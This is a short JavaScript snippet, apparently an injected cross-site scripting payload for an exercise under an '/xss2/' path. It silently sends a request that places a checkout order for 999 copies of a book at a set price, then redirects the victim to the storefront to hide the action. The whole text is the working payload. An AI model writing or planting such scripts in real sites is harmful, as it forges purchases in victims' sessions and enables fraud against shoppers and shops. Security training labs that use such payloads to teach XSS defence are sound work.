var request = new XMLHttpRequest();
request.open("GET", "/xss2/checkout?id=3&qty=999&name=TwentyThousandLeaguesUnderTheSea&price=24000", true);
request.send(null);
window.location.replace("/xss2/storefront");